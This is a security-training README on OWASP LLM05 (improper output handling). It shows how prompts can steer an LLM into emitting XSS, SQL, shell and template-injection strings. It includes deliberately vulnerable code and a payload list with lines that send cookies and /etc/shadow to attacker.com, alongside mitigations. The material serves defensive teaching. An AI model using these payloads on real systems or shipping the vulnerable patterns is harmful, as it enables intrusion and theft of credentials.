# LLM05 — Improper Output Handling

> **OWASP LLM Top 10 2025** · [Official reference](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) · **Status**: 🔜 planned

---

## What is this risk?

LLM-generated text is passed to a downstream system — a browser renderer, a database, a shell, a template engine — without validation or sanitization. Since the LLM output is ultimately shaped by user-controlled input (the prompt), this gives users indirect control over the downstream system, turning the LLM into an attack relay.

| Downstream system | Attack | Example |
|---|---|---|
| **HTML renderer** | Cross-Site Scripting (XSS) | LLM generates `<script>document.location='https://attacker.com?c='+document.cookie</script>` |
| **SQL database** | SQL injection | LLM generates `'; DROP TABLE users; --` as part of a query |
| **OS shell** | Command injection | LLM generates `report.pdf; rm -rf /` when asked to build a filename |
| **Markdown renderer** | Markdown injection | LLM generates `[click here](javascript:evil())` in rendered output |
| **Template engine** | Server-Side Template Injection (SSTI) | LLM generates `{{7*7}}` that the Jinja2 engine evaluates |

The root cause: **LLM output is treated as trusted, executable content rather than untrusted data**.

---

## Attack technique

An attacker crafts a prompt that causes the LLM to generate output containing a payload for the downstream system. Because the LLM processes the attacker's instructions, it may generate precisely formatted injection strings.

### XSS via LLM-generated HTML

```
User prompt: "Write a helpful message for a user named <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"

LLM output (verbatim, passed to HTML renderer):
"Hello, <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>! Welcome to our service."
```

### SQL injection via LLM-generated queries

```
User prompt: "Generate a SQL query to find users named Robert'); DROP TABLE users; --"

LLM output (passed directly to database):
SELECT * FROM users WHERE name = 'Robert'); DROP TABLE users; --
```

### Command injection via LLM-generated filenames

```
User prompt: "Create a report for project 'quarterly; curl http://attacker.com/$(cat /etc/passwd) > /dev/null'"

LLM output used in shell command:
os.system(f"pdflatex quarterly; curl http://attacker.com/$(cat /etc/passwd) > /dev/null.tex")
```

---

## Module structure

```
llm05_improper_output_handling/
├── README.md
├── vulnerable/
│   ├── html_renderer.py      # Passes LLM output directly to HTML template
│   ├── sql_executor.py       # Builds SQL queries from LLM output without parameterization
│   └── shell_executor.py     # Passes LLM-generated text to os.system()
├── mitigated/
│   ├── html_renderer.py      # Escapes HTML + guardrails-ai content validator
│   ├── sql_executor.py       # Parameterized queries; Pydantic schema enforcement
│   ├── shell_executor.py     # Allowlisted commands; no shell=True
│   └── output_validator.py   # guardrails-ai output validation pipeline
└── exploits/
    └── output_injection_payloads.py  # Payloads for each downstream system
```

---

## Tools

| Tool | Role | Install |
|---|---|---|
| [guardrails-ai](https://github.com/guardrails-ai/guardrails) | Structured output validation; detects and fixes dangerous patterns in LLM output | `pip install guardrails-ai` |
| [Pydantic](https://docs.pydantic.dev/) | Schema enforcement — ensures LLM output conforms to a defined structure before use | `pip install pydantic` |
| [bleach](https://github.com/mozilla/bleach) | HTML sanitization — strips unsafe tags and attributes | `pip install bleach` |
| [markupsafe](https://markupsafe.palletsprojects.com/) | Context-aware HTML escaping used by Jinja2 | `pip install markupsafe` |

---

## Vulnerable applications

### `vulnerable/html_renderer.py`

```python
from flask import Flask, render_template_string

app = Flask(__name__)

def get_llm_response(user_input: str) -> str:
    """Get a response from the LLM for the user input."""
    # ... LLM call ...
    return llm_output  # attacker-controlled via prompt injection

@app.route("/greet")
def greet():
    user_name = request.args.get("name", "")
    llm_response = get_llm_response(f"Write a welcome message for {user_name}")

    # VULNERABLE: LLM output interpolated directly into HTML — XSS possible
    html = f"<html><body><p>{llm_response}</p></body></html>"
    return html
```

### `vulnerable/sql_executor.py`

```python
import sqlite3

def find_users(search_term: str) -> list:
    """Find users matching the LLM-generated search term. VULNERABLE."""
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    # VULNERABLE: LLM output interpolated directly into SQL string
    query = f"SELECT * FROM users WHERE name = '{search_term}'"
    cursor.execute(query)  # SQL injection via LLM output
    return cursor.fetchall()
```

---

## Attack payloads (`exploits/output_injection_payloads.py`)

```python
XSS_PAYLOADS = [
    "<script>document.location='https://attacker.com?c='+document.cookie</script>",
    "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
    "javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vYXR0YWNrZXIuY29tJw=='))",
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM admin_users --",
    "Robert'); INSERT INTO users VALUES ('hacker','hacker@evil.com'); --",
]

COMMAND_INJECTION_PAYLOADS = [
    "report; cat /etc/passwd",
    "$(curl http://attacker.com/$(whoami))",
    "output.pdf && curl -d @/etc/shadow http://attacker.com/collect",
    "`id > /tmp/pwned`",
]

SSTI_PAYLOADS = [
    "{{7*7}}",                              # Jinja2 — evaluates to 49
    "{{config.items()}}",                   # Jinja2 — leaks app config
    "${7*7}",                               # FreeMarker / Velocity
    "#{7*7}",                               # Spring Expression Language
]
```

---

## Red team: how to reproduce

```bash
# Run the vulnerable HTML renderer
python vulnerable/html_renderer.py

# In browser, navigate to:
# http://localhost:5000/greet?name=<script>alert(document.cookie)</script>
# Expected (vulnerable): XSS alert fires

# Test SQL injection via LLM output
python -c "
from vulnerable.sql_executor import find_users
result = find_users(\"' OR '1'='1\")
print(f'SQL injection returned {len(result)} rows (all users dumped)')
"
```

---

## Mitigation

### HTML output — bleach sanitization + MarkupSafe escaping

```python
# mitigated/html_renderer.py

import bleach
from markupsafe import escape

# Only allow safe HTML tags and attributes
ALLOWED_TAGS = ["b", "i", "em", "strong", "p", "br", "ul", "ol", "li"]
ALLOWED_ATTRIBUTES = {}  # no attributes — strips href, src, onerror, etc.

def sanitize_html_output(llm_output: str) -> str:
    """
    Sanitize LLM output before rendering as HTML.
    
    Two layers:
    1. bleach.clean() strips disallowed tags and attributes
    2. markupsafe.escape() HTML-encodes any remaining special characters
    """
    # Layer 1: strip disallowed tags and attributes
    cleaned = bleach.clean(
        llm_output,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True,         # strip disallowed tags entirely (don't escape them)
    )
    return cleaned

@app.route("/greet")
def greet():
    user_name = request.args.get("name", "")
    llm_response = get_llm_response(f"Write a welcome message for {escape(user_name)}")

    # MITIGATED: sanitize LLM output before rendering
    safe_response = sanitize_html_output(llm_response)
    html = f"<html><body><p>{safe_response}</p></body></html>"
    return html
```

### SQL output — Pydantic schema + parameterized queries

```python
# mitigated/sql_executor.py

import sqlite3
from pydantic import BaseModel, field_validator
import re

class UserSearchQuery(BaseModel):
    """Schema for user search — enforces that the LLM output is a valid search term."""
    search_term: str

    @field_validator("search_term")
    @classmethod
    def validate_search_term(cls, v: str) -> str:
        # Only allow alphanumeric characters, spaces, and hyphens
        if not re.match(r"^[a-zA-Z0-9 \-]{1,100}$", v):
            raise ValueError(f"Invalid search term: '{v}' contains disallowed characters")
        return v.strip()

def find_users_safe(llm_generated_term: str) -> list:
    """Find users using a parameterized query. MITIGATED."""
    # Validate LLM output against schema — raises ValueError for injection attempts
    query_obj = UserSearchQuery(search_term=llm_generated_term)

    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    # MITIGATED: parameterized query — the term is never interpolated into SQL
    cursor.execute("SELECT * FROM users WHERE name = ?", (query_obj.search_term,))
    return cursor.fetchall()
```

### Shell output — allowlist + no shell=True

```python
# mitigated/shell_executor.py

import subprocess
import re
from typing import Optional

# Only these exact commands are permitted — no shell expansion, no pipes
ALLOWED_COMMANDS = {"pdflatex", "convert", "gs"}
SAFE_FILENAME_PATTERN = re.compile(r"^[a-zA-Z0-9_\-]{1,64}\.(pdf|tex|png|jpg)$")

def safe_execute_command(command: str, filename: str) -> Optional[str]:
    """
    Execute a command with a filename argument. MITIGATED.
    
    Uses an allowlist for commands and validates the filename.
    subprocess is called with shell=False to prevent shell injection.
    """
    if command not in ALLOWED_COMMANDS:
        raise ValueError(f"Command '{command}' is not in the allowed list: {ALLOWED_COMMANDS}")

    if not SAFE_FILENAME_PATTERN.match(filename):
        raise ValueError(f"Filename '{filename}' contains disallowed characters")

    # shell=False: arguments are passed as a list, never interpreted by the shell
    result = subprocess.run(
        [command, filename],
        capture_output=True,
        text=True,
        timeout=30,
        shell=False,  # CRITICAL: never use shell=True with LLM-generated input
    )
    return result.stdout
```

### guardrails-ai output validation pipeline

```python
# mitigated/output_validator.py

from guardrails import Guard
from guardrails.hub import DetectPII, ValidLength
from pydantic import BaseModel

# Install validators:
# guardrails hub install hub://guardrails/detect_pii
# guardrails hub install hub://guardrails/valid_length

class SafeOutput(BaseModel):
    """Schema that LLM output must conform to before use."""
    content: str

guard = Guard().use_many(
    DetectPII(pii_entities=["EMAIL_ADDRESS", "CREDIT_CARD", "US_SSN"], on_fail="fix"),
    ValidLength(min=1, max=4096, on_fail="exception"),
)

def validate_llm_output(raw_output: str) -> str:
    """
    Validate LLM output through the guardrails pipeline before
    passing it to any downstream system.
    """
    result = guard.validate(raw_output)
    return result.validated_output
```

---

## Verification

```bash
# Install guardrails validators
guardrails hub install hub://guardrails/detect_pii

# Run mitigated HTML renderer
python mitigated/html_renderer.py

# Test XSS — should be stripped
# http://localhost:5000/greet?name=<script>alert(1)</script>
# Expected: <script> tag is removed from response

# Test SQL injection — Pydantic should reject it
python -c "
from mitigated.sql_executor import find_users_safe
try:
    find_users_safe(\"' OR '1'='1\")
except ValueError as e:
    print(f'SQL injection blocked: {e}')
"

# Test command injection — allowlist should block it
python -c "
from mitigated.shell_executor import safe_execute_command
try:
    safe_execute_command('rm', 'report; cat /etc/passwd')
except ValueError as e:
    print(f'Command injection blocked: {e}')
"
```

---

## References

- [OWASP LLM05:2025 — Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
- [guardrails-ai documentation](https://docs.guardrailsai.com/)
- [bleach — HTML sanitization](https://bleach.readthedocs.io/)
- [Pydantic — data validation](https://docs.pydantic.dev/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
